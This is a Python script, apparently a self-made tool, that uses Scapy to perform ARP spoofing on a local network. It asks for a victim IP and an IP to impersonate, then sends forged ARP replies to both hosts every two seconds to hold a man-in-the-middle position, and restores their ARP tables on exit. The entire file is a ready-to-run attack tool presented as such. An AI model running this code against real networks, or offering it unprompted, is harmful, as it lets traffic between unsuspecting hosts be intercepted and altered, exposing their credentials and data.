from scapy.layers.l2 import ARP, Ether, getmacbyip, get_if_hwaddr
from scapy.all import sendp, conf
import os
import time
import ipaddress


# Ensure that you have IP forwarding on the attacker machine (Linux example)
# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Just a check to see if the IP is correctly formatted
def is_valid_ip(target):
  try:
    ipaddress.ip_address(target)
    return True
  except ValueError:
    return False

def spoof_arp(target_ip, target_mac, spoof_ip, attacker_mac):
  # Send an ARP reply to `target_ip`, telling it that `spoof_ip`
  # is associated with the attacker's MAC address.
  # Using broadcast

  # Create an Ethernet frame with the correct target MAC address
  ether = Ether(src=attacker_mac, dst=target_mac)
  # Create the ARP packet
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
  # Send combined Ethernet + ARP packet
  packet = ether / arp
  sendp(packet, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac, attacker_mac):
  # Restore the ARP table for `target_ip`, telling it that `source_ip`
  # is associated with `source_mac`.

  ether = Ether(src=attacker_mac, dst=target_mac)
  arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
  packet = ether / arp
  sendp(packet, count=5, verbose=False)

def main():

  while True:
    victim_ip = input("Declare the IP of the victim you want to target:\n")
    if is_valid_ip(victim_ip):
      break
    print("Wrong IP format")

  victim_mac = getmacbyip(victim_ip)

  while True:
    spoofed_ip_origin = input("Declare the IP of the target want to spoof as:\n")
    if is_valid_ip(spoofed_ip_origin):
      break
    print("Wrong IP format")

  spoofed_mac_origin = getmacbyip(spoofed_ip_origin)

  attacker_mac = get_if_hwaddr(conf.iface)  # Replace with your machine's MAC address

  print(f"Starting ARP spoofing as {spoofed_ip_origin} for victim {victim_ip}...")
  try:
    while True:
      # Tell the victim that the spoofed IP is at the attacker's MAC
      spoof_arp(victim_ip, victim_mac, spoofed_ip_origin, attacker_mac)
      # Tell the machine we spoof that the victim is at the attacker's MAC
      spoof_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, attacker_mac)
      time.sleep(2)  # Repeat every 2 seconds to maintain the MITM position
  except KeyboardInterrupt:
    print("Stopping ARP spoofing and restoring ARP tables...")
    restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
    restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)   # Original victim_mac_here

if __name__ == "__main__":
  main()